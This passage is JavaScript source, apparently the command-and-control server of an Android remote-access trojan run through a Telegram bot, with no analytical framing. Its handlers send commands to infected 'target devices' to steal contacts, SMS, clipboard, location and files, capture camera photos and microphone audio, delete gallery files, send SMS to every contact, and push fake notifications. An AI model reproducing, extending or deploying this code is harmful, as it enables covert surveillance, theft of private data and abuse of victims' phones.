                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('contacts'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('messages'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('apps'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('device_info'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('clipboard'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('camera_main'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('camera_selfie'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('location'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('vibrate'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                try { ws.send('stop_audio'); } catch(e){}
            }
        });
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, LOADING_MSG, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }).catch(e => console.log(e))
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id).catch(e => console.log(e))
        appBot.sendMessage(id,
            ROMEO_HEADER +
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(e => console.log(e))
        currentUuid = uuid
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        try {
            ws.send('ping')
        } catch (error) {
            // Error ignored to prevent Railway crash
        }
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

appServer.listen(process.env.PORT || 8999);
